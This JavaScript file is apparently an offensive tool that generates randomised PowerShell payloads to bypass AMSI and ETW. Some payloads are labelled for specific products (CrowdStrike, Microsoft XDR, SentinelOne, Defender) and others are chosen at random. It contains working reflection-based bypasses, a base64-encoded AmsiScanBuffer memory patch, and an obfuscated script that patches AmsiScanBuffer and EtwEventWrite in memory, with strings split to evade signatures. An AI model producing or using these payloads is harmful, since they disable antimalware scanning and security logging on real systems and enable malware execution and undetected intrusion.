// Generate a random string of specified length
function randomString(length) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// Generate a random integer between 0 and max (inclusive)
function randomInt(max) {
    return Math.floor(Math.random() * (max + 1));
}

function getPayload(edr) {
    let memvar = randomString(3 + randomInt(7)); // Random variable name of length 3 to 10

    // Existing payloads for Random selection
    const ForceErrer = `#Unknown - Force error \n$${memvar}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext", "NonPublic,Static").SetValue($null, [IntPtr]$${memvar});`;
    const MattGRefl = `#Matt Graebers Reflection method \n$${memvar}="System.Management.Automation.AmsiUtils";[Ref].Assembly.GetType($${memvar}).GetField('amsiInitFailed',"NonPublic,Static").SetValue($null,$true);`;
    const MattGReflLog = `#Matt Graebers Reflection method with WMF5 autologging bypass \n$${memvar}="System.Management.Automation.AmsiUtils";[Delegate]::CreateDelegate(("Func\`\`3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType($${memvar})),('GetField')).Invoke('amsiInitFailed',(("NonPublic,Static") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);`;
    const MattGref02 = `#Matt Graebers second Reflection method \n$${memvar}="System.Management.Automation.AmsiUtils";[Runtime.InteropServices.Marshal]::("WriteInt32")([Ref].Assembly.GetType($${memvar}).GetField("amsiContext",[Reflection.BindingFlags]"NonPublic,Static").GetValue($null),0x${randomInt(2147483647).toString(16)});`;
    const RastaBuf = atob("I1Jhc3RhLW1vdXNlcyBBbXNpLVNjYW4tQnVmZmVyIHBhdGNoIFxuDQokV2luMzIgPSBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KcHVibGljIGNsYXNzIFdpbjMyIHsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7DQogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIFVJbnRQdHIgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpOw0KfQ0KIkANCg0KQWRkLVR5cGUgJFdpbjMyDQoNCiRMaWJMb2FkID0gW1dpbjMyXTo6TG9hZExpYnJhcnkoImFtc2kuZGxsIikNCiRNZW1BZHIgPSBbV2luMzJdOjpHZXRQcm9jQWRkcmVzcygkTGliTG9hZCwgIkFtc2lTY2FuQnVmZmVyIikNCiRwID0gMA0KW1dpbjMyXTo6VmlydHVhbFByb3RlY3QoJE1lbUFkciwgW3VpbnQzMl01LCAweDQwLCBbcmVmXSRwKQ0KJHZhcjEgPSAiMHhCOCINCiR2YXIyID0gIjB4NTciDQokdmFyMyA9ICIweDAwIg0KJHZhcjQgPSAiMHgwNyINCiR2YXI1ID0gIjB4ODAiDQokdmFyNiA9ICIweEMzIg0KJFBhdGNoID0gW0J5dGVbXV0gKCR2YXIxLCR2YXIyLCR2YXIzLCR2YXI0LCskdmFyNSwrJHZhcjYpDQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQYXRjaCwgMCwgJE1lbUFkciwgNik=");

    // EDR-specific payloads
    const crowdStrikePayload = `#CrowdStrike AMSI and ETW Bypass\n$asm = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.EndsWith(('Sys' + 'tem.dll')) }
    $typ = $asm.GetType(('Micro' + 'soft.Win' + '32.Unsafe' + 'NativeMethods'))
    $mth = $typ.GetMethods() | Where-Object { $_.Name -cmatch ('^Ge' + '.*P.*oc.*' + 'ddress$') }
    $mod = $typ.GetMethod(('Get' + 'Module' + 'Handle'))
    $amh = $mod.Invoke($null, @(('am' + 'si.d' + 'll')))
    $p = $mth[0].Invoke($null, @($amh, ('Ams' + 'iScan' + 'Buffer')))
    $ab = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName(('Ref' + 'lected' + 'Delegate'))), [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $mb = $ab.DefineDynamicModule(('InMem' + 'oryMod' + 'ule'), $false)
    $pt = @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType())
    $rt = [Bool]
    $tb = $mb.DefineType(('MyDel' + 'egate' + 'Type'), ('Class' + ',Public,Sealed,AnsiClass,AutoClass'), [MulticastDelegate])
    $cb = $tb.DefineConstructor(('RTSpe' + 'cialName,HideBySig,Public'), [Reflection.CallingConventions]::Standard, $pt)
    $cb.SetImplementationFlags(('Run' + 'time,Managed'))
    $dm = $tb.DefineMethod(('Invo' + 'ke'), ('Public,Hide' + 'BySig,NewSlot,Virtual'), $rt, $pt)
    $dm.SetImplementationFlags(('Run' + 'time,Managed'))
    $dt = $tb.CreateType()
    $vpm = $mod.Invoke($null, @(('kern' + 'el32.d' + 'll')))
    $vpp = $mth[0].Invoke($null, @($vpm, ('Virt' + 'ualPro' + 'tect')))
    $v = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vpp, $dt)
    $o = 0
    $pr = $v.Invoke($p, 3, 0x40, [ref]$o)
    Start-Sleep 1
    [Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8, 0x00, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3), 0, $p, 12)
    $emh = $mod.Invoke($null, @(('nt' + 'dll.d' + 'll')))
    $e = $mth[0].Invoke($null, @($emh, ('Etw' + 'Event' + 'Write')))
    $o = 0
    $pr = $v.Invoke($e, 3, 0x40, [ref]$o)
    $s = [Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
    if ($s -eq 8) {
        [Runtime.InteropServices.Marshal]::WriteByte($e, 0xC3)
    } else {
        [Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8, 0xff, 0x55), 0, $e, 3)
    }`;
    const microsoftXDRPayload = `#MicrosoftXDR AMSI Bypass (Placeholder) \n$${memvar}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext", "NonPublic,Static").SetValue($null, [IntPtr]$${memvar});`;
    const sentinelOnePayload = `#SentinelOne AMSI Bypass (Placeholder) \n$${memvar}="System.Management.Automation.AmsiUtils";[Runtime.InteropServices.Marshal]::("WriteInt32")([Ref].Assembly.GetType($${memvar}).GetField("amsiContext",[Reflection.BindingFlags]"NonPublic,Static").GetValue($null),0x${randomInt(2147483647).toString(16)});`;
    const defenderPayload = `#Defender AMSI Bypass (Placeholder) \n$${memvar}="System.Management.Automation.AmsiUtils";[Delegate]::CreateDelegate(("Func\`\`3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType($${memvar})),('GetField')).Invoke('amsiInitFailed',(("NonPublic,Static") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);`;

    switch (edr) {
        case 'CrowdStrike':
            return crowdStrikePayload;
        case 'MicrosoftXDR':
            return microsoftXDRPayload;
        case 'SentinelOne':
            return sentinelOnePayload;
        case 'Defender':
            return defenderPayload;
        case 'Random':
        default:
            switch (randomInt(4)) {
                case 0:
                    return ForceErrer;
                case 1:
                    return MattGRefl;
                case 2:
                    return MattGReflLog;
                case 3:
                    return MattGref02;
                case 4:
                    return RastaBuf;
            }
    }
}
